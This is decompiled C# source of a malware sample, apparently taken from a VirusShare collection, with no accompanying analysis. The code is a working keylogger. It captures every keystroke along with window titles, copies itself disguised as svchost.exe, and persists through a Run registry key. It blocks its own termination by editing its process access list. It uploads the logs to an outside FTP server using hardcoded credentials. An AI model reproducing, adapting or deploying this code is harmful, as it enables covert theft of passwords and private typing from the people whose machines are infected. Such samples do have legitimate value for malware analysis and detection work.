// Decompiled with JetBrains decompiler
// Type: Program
// Assembly: explorer, Version=6.1.7600.16385, Culture=neutral, PublicKeyToken=null
// MVID: 5F841184-0224-40CA-AE44-37DE24BDF137
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Blocker.luv-6de93d5551a0f92d43a31e36213dc9300183c3327b4cc1a1fac3739d9e1b2fc0.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Threading;

internal class Program
{
  private static IntPtr hwnd;
  private static IntPtr lastHwnd;
  private static StringBuilder stringTitle = new StringBuilder(256);
  private static StringBuilder processName = new StringBuilder(1000);
  private static string title;
  private static string process;
  private static uint lpdwProcessId;
  private static IntPtr hProcess;
  private static string stringKeyLog;
  private static int i;
  private static int x;
  private static int x2;
  private static string mydocpath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Log\\";
  private static string destinationPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\svchost.exe";
  private static bool isclosing = false;
  private static int time = 0;
  private static Mutex mutex;
  private static RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
  private static readonly string[] VietnameseSigns = new string[12]
  {
    "aAeEoOuUiIdDyY",
    "áàạảãâấầậẩẫăắằặẳẵ",
    "ÁÀẠẢÃÂẤẦẬẨẪĂẮẰẶẲẴ",
    "éèẹẻẽêếềệểễ",
    "ÉÈẸẺẼÊẾỀỆỂỄ",
    "óòọỏõôốồộổỗơớờợởỡ",
    "ÓÒỌỎÕÔỐỒỘỔỖƠỚỜỢỞỠ",
    "úùụủũưứừựửữ",
    "ÚÙỤỦŨƯỨỪỰỬỮ",
    "íìịỉĩ",
    "ýỳỵỷỹ",
    "ÝỲỴỶỸ"
  };

  [DllImport("advapi32.dll", SetLastError = true)]
  private static extern bool GetKernelObjectSecurity(
    IntPtr Handle,
    int securityInformation,
    [Out] byte[] pSecurityDescriptor,
    uint nLength,
    out uint lpnLengthNeeded);

  private static RawSecurityDescriptor GetProcessSecurityDescriptor(
    IntPtr processHandle)
  {
    byte[] pSecurityDescriptor = new byte[0];
    uint lpnLengthNeeded;
    Program.GetKernelObjectSecurity(processHandle, 4, pSecurityDescriptor, 0U, out lpnLengthNeeded);
    if (lpnLengthNeeded < 0U || lpnLengthNeeded > (uint) short.MaxValue)
      return (RawSecurityDescriptor) null;
    byte[] binaryForm;
    return !Program.GetKernelObjectSecurity(processHandle, 4, binaryForm = new byte[(IntPtr) lpnLengthNeeded], lpnLengthNeeded, out lpnLengthNeeded) ? (RawSecurityDescriptor) null : new RawSecurityDescriptor(binaryForm, 0);
  }

  [DllImport("advapi32.dll", SetLastError = true)]
  private static extern bool SetKernelObjectSecurity(
    IntPtr Handle,
    int securityInformation,
    [In] byte[] pSecurityDescriptor);

  private static void SetProcessSecurityDescriptor(IntPtr processHandle, RawSecurityDescriptor dacl)
  {
    byte[] numArray = new byte[dacl.BinaryLength];
    dacl.GetBinaryForm(numArray, 0);
    Program.SetKernelObjectSecurity(processHandle, 4, numArray);
  }

  [DllImport("kernel32.dll")]
  private static extern IntPtr GetCurrentProcess();

  [DllImport("user32.dll", CharSet = CharSet.Auto)]
  private static extern short GetAsyncKeyState(int vkey);

  [DllImport("user32.dll", CharSet = CharSet.Auto)]
  private static extern IntPtr GetForegroundWindow();

  [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
  private static extern int GetWindowText(IntPtr hWnd, [Out] StringBuilder lpString, int nMaxCount);

  [DllImport("user32.dll")]
  private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

  [DllImport("kernel32.dll")]
  private static extern IntPtr OpenProcess(
    uint dwDesiredAccess,
    bool bInheritHandle,
    uint dwProcessId);

  [DllImport("kernel32.dll")]
  private static extern bool CloseHandle(IntPtr handle);

  [DllImport("psapi.dll")]
  private static extern uint GetProcessImageFileName(
    IntPtr hProcess,
    [Out] StringBuilder lpImageFileName,
    [MarshalAs(UnmanagedType.U4), In] int nSize);

  private static string xoadau(string str)
  {
    for (int index1 = 1; index1 < Program.VietnameseSigns.Length; ++index1)
    {
      for (int index2 = 0; index2 < Program.VietnameseSigns[index1].Length; ++index2)
        str = str.Replace(Program.VietnameseSigns[index1][index2], Program.VietnameseSigns[0][index1 - 1]);
    }
    return str;
  }

  private static void Main(string[] args)
  {
    try
    {
      Program.checkInstance();
      Program.copytoDestination();
      Program.makeFileLog();
      while (!Program.isclosing)
      {
        Program.protect();
        ++Program.time;
        Program.lastHwnd = Program.GetForegroundWindow();
        if (Program.hwnd != Program.lastHwnd)
        {
          Program.hwnd = Program.GetForegroundWindow();
          Program.GetWindowText(Program.lastHwnd, Program.stringTitle, Program.stringTitle.Capacity);
          Program.title = Program.stringTitle.ToString().Trim(' ');
          int windowThreadProcessId = (int) Program.GetWindowThreadProcessId(Program.lastHwnd, out Program.lpdwProcessId);
          Program.hProcess = Program.OpenProcess(1040U, false, Program.lpdwProcessId);
          int processImageFileName = (int) Program.GetProcessImageFileName(Program.hProcess, Program.processName, Program.processName.Capacity);
          Program.CloseHandle(Program.hProcess);
          Program.process = Program.processName.ToString();
          if (Program.title != "")
          {
            Program.stringKeyLog = Program.stringKeyLog + Environment.NewLine + "[ " + DateTime.Now.ToString("HH:mm:ss") + " ] [ " + Program.xoadau(Program.title);
            Program.stringKeyLog = Program.stringKeyLog + " ] [ " + Program.xoadau(Program.process) + " ]" + Environment.NewLine;
          }
        }
        Program.keyLog();
        Thread.Sleep(10);
        if (Program.time == 1000)
        {
          Program.writeLog(Program.stringKeyLog);
          Program.stringKeyLog = "";
          Program.time = 0;
          Program.rkApp.SetValue("Microsoft", (object) Program.destinationPath);
        }
      }
    }
    catch (Exception ex)
    {
    }
  }

  private static void checkInstance()
  {
    try
    {
      Program.mutex = Mutex.OpenExisting("SINGLEINSTANCE");
      if (Program.mutex == null)
        return;
      Environment.Exit(0);
    }
    catch (WaitHandleCannotBeOpenedException ex)
    {
      Program.mutex = new Mutex(true, "SINGLEINSTANCE");
    }
  }

  private static void copytoDestination()
  {
    try
    {
      if (!(Environment.GetCommandLineArgs()[0].ToLower() != Program.destinationPath.ToLower()) || System.IO.File.Exists(Program.destinationPath))
        return;
      System.IO.File.Copy(Environment.GetCommandLineArgs()[0], Program.destinationPath);
      Process.Start(new ProcessStartInfo()
      {
        FileName = Program.destinationPath
      });
    }
    catch (Exception ex)
    {
    }
  }

  private static void makeFileLog()
  {
    try
    {
      if (!Directory.Exists(Program.mydocpath))
        Directory.CreateDirectory(Program.mydocpath);
      Program.uploadFTP();
      DateTime now = DateTime.Now;
      Program.mydocpath = Program.mydocpath + Environment.MachineName.ToString() + "_" + now.ToString("dd-MM-yy");
      Program.mydocpath = Program.mydocpath + "_" + now.ToString("hh") + "-" + now.ToString("mm") + "-" + now.ToString("ss") + ".log";
      Program.writeLog("Start log at: " + (object) now, true);
    }
    catch (Exception ex)
    {
    }
  }

  private static void keyLog()
  {
    for (Program.i = 65; Program.i <= 90; ++Program.i)
    {
      Program.x = (int) Program.GetAsyncKeyState(Program.i);
      Program.x2 = (int) Program.GetAsyncKeyState(16);
      if (Program.x == -32767)
        Program.stringKeyLog = Program.x2 != (int) short.MinValue ? Program.stringKeyLog + (object) Convert.ToChar(Program.i + 32) : Program.stringKeyLog + (object) Convert.ToChar(Program.i);
    }
    for (Program.i = 8; Program.i <= 222; ++Program.i)
    {
      if (Program.i == 65)
        Program.i = 91;
      Program.x = (int) Program.GetAsyncKeyState(Program.i);
      Program.x2 = (int) Program.GetAsyncKeyState(16);
      if (Program.x == -32767)
      {
        switch (Program.i)
        {
          case 8:
            Program.stringKeyLog += " [BS] ";
            continue;
          case 9:
            Program.stringKeyLog += " [Tab] ";
            continue;
          case 13:
            Program.stringKeyLog += " [Enter] ";
            continue;
          case 17:
            Program.stringKeyLog += " [Ctrl]";
            continue;
          case 18:
            Program.stringKeyLog += " [Alt] ";
            continue;
          case 19:
            Program.stringKeyLog += " [Pause] ";
            continue;
          case 20:
            Program.stringKeyLog += " [Capslock] ";
            continue;
          case 27:
            Program.stringKeyLog += " [Esc] ";
            continue;
          case 32:
            Program.stringKeyLog += " ";
            continue;
          case 33:
            Program.stringKeyLog += " [PgUp] ";
            continue;
          case 34:
            Program.stringKeyLog += " [PgDn] ";
            continue;
          case 35:
            Program.stringKeyLog += " [End] ";
            continue;
          case 36:
            Program.stringKeyLog += " [Home] ";
            continue;
          case 37:
            Program.stringKeyLog += " [Left] ";
            continue;
          case 38:
            Program.stringKeyLog += " [Up] ";
            continue;
          case 39:
            Program.stringKeyLog += " [Right] ";
            continue;
          case 40:
            Program.stringKeyLog += " [Down] ";
            continue;
          case 41:
            Program.stringKeyLog += " [Select] ";
            continue;
          case 44:
            Program.stringKeyLog += " [Screen] ";
            continue;
          case 45:
            Program.stringKeyLog += " [Insert] ";
            continue;
          case 46:
            Program.stringKeyLog += " [Del] ";
            continue;
          case 47:
            Program.stringKeyLog += " [Help] ";
            continue;
          case 48:
            Program.stringKeyLog += Program.x2 == (int) short.MinValue ? ")" : "0";
            continue;
          case 49:
            Program.stringKeyLog += Program.x2 == (int) short.MinValue ? "!" : "1";
            continue;
          case 50:
            Program.stringKeyLog += Program.x2 == (int) short.MinValue ? "@" : "2";
            continue;
          case 51:
            Program.stringKeyLog += Program.x2 == (int) short.MinValue ? "#" : "3";
            continue;
          case 52:
            Program.stringKeyLog += Program.x2 == (int) short.MinValue ? "$" : "4";
            continue;
          case 53:
            Program.stringKeyLog += Program.x2 == (int) short.MinValue ? "%" : "5";
            continue;
          case 54:
            Program.stringKeyLog += Program.x2 == (int) short.MinValue ? "^" : "6";
            continue;
          case 55:
            Program.stringKeyLog += Program.x2 == (int) short.MinValue ? "&" : "7";
            continue;
          case 56:
            Program.stringKeyLog += Program.x2 == (int) short.MinValue ? "(" : "8";
            continue;
          case 57:
            Program.stringKeyLog += Program.x2 == (int) short.MinValue ? ")" : "9";
            continue;
          case 91:
            Program.stringKeyLog += " [WIN] ";
            continue;
          case 92:
            Program.stringKeyLog += " [WIN] ";
            continue;
          case 96:
            Program.stringKeyLog += "0";
            continue;
          case 97:
            Program.stringKeyLog += "1";
            continue;
          case 98:
            Program.stringKeyLog += "2";
            continue;
          case 99:
            Program.stringKeyLog += "3";
            continue;
          case 100:
            Program.stringKeyLog += "4";
            continue;
          case 101:
            Program.stringKeyLog += "5";
            continue;
          case 102:
            Program.stringKeyLog += "6";
            continue;
          case 103:
            Program.stringKeyLog += "7";
            continue;
          case 104:
            Program.stringKeyLog += "8";
            continue;
          case 105:
            Program.stringKeyLog += "9";
            continue;
          case 106:
            Program.stringKeyLog += "*";
            continue;
          case 107:
            Program.stringKeyLog += "+";
            continue;
          case 109:
            Program.stringKeyLog += "-";
            continue;
          case 110:
            Program.stringKeyLog += ".";
            continue;
          case 111:
            Program.stringKeyLog += "/";
            continue;
          case 112:
            Program.stringKeyLog += "F1";
            continue;
          case 113:
            Program.stringKeyLog += "F2";
            continue;
          case 114:
            Program.stringKeyLog += "F3";
            continue;
          case 115:
            Program.stringKeyLog += "F4";
            continue;
          case 116:
            Program.stringKeyLog += "F5";
            continue;
          case 117:
            Program.stringKeyLog += "F6";
            continue;
          case 118:
            Program.stringKeyLog += "F7";
            continue;
          case 119:
            Program.stringKeyLog += "F8";
            continue;
          case 120:
            Program.stringKeyLog += "F9";
            continue;
          case 121:
            Program.stringKeyLog += "F10";
            continue;
          case 122:
            Program.stringKeyLog += "F11";
            continue;
          case 123:
            Program.stringKeyLog += "F12";
            continue;
          case 186:
            Program.stringKeyLog += Program.x2 == (int) short.MinValue ? ":" : ";";
            continue;
          case 187:
            Program.stringKeyLog += Program.x2 == (int) short.MinValue ? "+" : "=";
            continue;
          case 188:
            Program.stringKeyLog += Program.x2 == (int) short.MinValue ? "<" : ",";
            continue;
          case 189:
            Program.stringKeyLog += Program.x2 == (int) short.MinValue ? "_" : "-";
            continue;
          case 190:
            Program.stringKeyLog += Program.x2 == (int) short.MinValue ? ">" : ".";
            continue;
          case 191:
            Program.stringKeyLog += Program.x2 == (int) short.MinValue ? "?" : "/";
            continue;
          case 192:
            Program.stringKeyLog += Program.x2 == (int) short.MinValue ? "~" : "`";
            continue;
          case 219:
            Program.stringKeyLog += Program.x2 == (int) short.MinValue ? "{" : "[";
            continue;
          case 220:
            Program.stringKeyLog += Program.x2 == (int) short.MinValue ? "|" : Convert.ToChar(92).ToString();
            continue;
          case 221:
            Program.stringKeyLog += Program.x2 == (int) short.MinValue ? "}" : "]";
            continue;
          case 222:
            Program.stringKeyLog += Program.x2 == (int) short.MinValue ? Convert.ToChar(34).ToString() : Convert.ToChar(44).ToString();
            continue;
          default:
            continue;
        }
      }
    }
  }

  private static void writeLog(string stringKl, bool isline = false)
  {
    try
    {
      TextWriter textWriter = (TextWriter) new StreamWriter(Program.mydocpath, true);
      if (isline)
        textWriter.WriteLine(stringKl);
      else
        textWriter.Write(stringKl);
      textWriter.Close();
    }
    catch (Exception ex)
    {
    }
  }

  private static void uploadFTP()
  {
    if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Log"))
      return;
    foreach (string file in Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Log", "*.log"))
    {
      bool flag = false;
      try
      {
        FtpWebRequest ftpWebRequest = (FtpWebRequest) WebRequest.Create("ftp://ftp.fall.vn//htdocs//Log//" + Path.GetFileName(file));
        ftpWebRequest.Method = "STOR";
        ftpWebRequest.Credentials = (ICredentials) new NetworkCredential("fall_10606112", "2508440");
        StreamReader streamReader = new StreamReader(file);
        byte[] bytes = Encoding.UTF8.GetBytes(streamReader.ReadToEnd());
        streamReader.Close();
        ftpWebRequest.ContentLength = (long) bytes.Length;
        Stream requestStream = ftpWebRequest.GetRequestStream();
        requestStream.Write(bytes, 0, bytes.Length);
        requestStream.Close();
        FtpWebResponse response = (FtpWebResponse) ftpWebRequest.GetResponse();
      }
      catch (Exception ex)
      {
        flag = true;
      }
      if (!flag)
        System.IO.File.Delete(file);
    }
  }

  private static void protect()
  {
    IntPtr currentProcess = Program.GetCurrentProcess();
    RawSecurityDescriptor securityDescriptor = Program.GetProcessSecurityDescriptor(currentProcess);
    securityDescriptor.DiscretionaryAcl.InsertAce(0, (GenericAce) new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, (SecurityIdentifier) null), false, (byte[]) null));
    Program.SetProcessSecurityDescriptor(currentProcess, securityDescriptor);
  }

  [System.Flags]
  private enum ProcessAccessRights
  {
    PROCESS_CREATE_PROCESS = 128, // 0x00000080
    PROCESS_CREATE_THREAD = 2,
    PROCESS_DUP_HANDLE = 64, // 0x00000040
    PROCESS_QUERY_INFORMATION = 1024, // 0x00000400
    PROCESS_QUERY_LIMITED_INFORMATION = 4096, // 0x00001000
    PROCESS_SET_INFORMATION = 512, // 0x00000200
    PROCESS_SET_QUOTA = 256, // 0x00000100
    PROCESS_SUSPEND_RESUME = 2048, // 0x00000800
    PROCESS_TERMINATE = 1,
    PROCESS_VM_OPERATION = 8,
    PROCESS_VM_READ = 16, // 0x00000010
    PROCESS_VM_WRITE = 32, // 0x00000020
    DELETE = 65536, // 0x00010000
    READ_CONTROL = 131072, // 0x00020000
    SYNCHRONIZE = 1048576, // 0x00100000
    WRITE_DAC = 262144, // 0x00040000
    WRITE_OWNER = 524288, // 0x00080000
    STANDARD_RIGHTS_REQUIRED = WRITE_OWNER | WRITE_DAC | READ_CONTROL | DELETE, // 0x000F0000
    PROCESS_ALL_ACCESS = 2035711, // 0x001F0FFF
  }
}
